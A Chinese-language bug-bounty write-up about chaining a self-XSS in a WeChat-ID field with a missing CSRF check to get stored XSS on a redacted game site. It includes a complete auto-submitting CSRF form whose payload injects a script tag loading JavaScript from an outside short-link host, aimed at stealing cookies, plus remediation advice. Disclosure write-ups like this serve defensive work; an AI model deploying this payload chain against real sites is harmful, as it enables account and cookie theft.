---
layout: post
title:  一个简单的selfxss+csrf=存储型xss
categories: [bounty]
tags: [bounty]
---
#### 漏洞演示：
在`https://game.AAA.com/home/3`

微信号处没有做过滤，导致可以写30个任意字符，造成了self xss

self xss是没有什么用的，刚好这里也没有防御csrf

所以我们可以通过csrf先将微信号修改成xss字符，然后用户访问用户中心即可触发xss，导致cookie等数据被盗，或者直接通过xss执行一些其他敏感操作

因为源站是https的，再加上只有30个字符，所以使用//可以直接继承`https://`，然后通过https的短链接加载外域js文件`https://www.thinkings.org/1.js`
![1.png](img/article/2018.1.21/1.png)
用户微信原来是
![2.png](img/article/2018.1.21/2.png)
访问如下html页面后
```
<body>
    <form action="https://game.AAA.com/home/setinfo" method="POST">
      <input type="hidden" name="year" value="2018" />
      <input type="hidden" name="month" value="1" />
      <input type="hidden" name="day" value="12" />
      <input type="hidden" name="province" value="110000" />
      <input type="hidden" name="city" value="110101" />
      <input type="hidden" name="county" value="" />
      <input type="hidden" name="qq" value="1111111" />
      <input type="hidden" name="wechat" value='"><script src="//dwz.is/onoxu' />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
![3.png](img/article/2018.1.21/3.png)
再访问`https://game.AAA.com/home/3`
触发xss，弹出cookie
![4.png](img/article/2018.1.21/4.png)
同时
`https://passport.AAA.com/home/info`的昵称处也存在xss，限制在2-20个字符

而且这个用户名数据还显示在`https://game.AAA.com/home/3`，会造成`https://game.AAA.com/home/3`这个页面有2个xss注入点，如果没有这个30个字符的点的话，我们还是可以通过拼接的方式来实现。


#### 修复建议：
用户的数据要么入库编码，要么出库编码；
修复csrf漏洞，限制referer或加token或者httponly(不过不能防御js操作攻击..)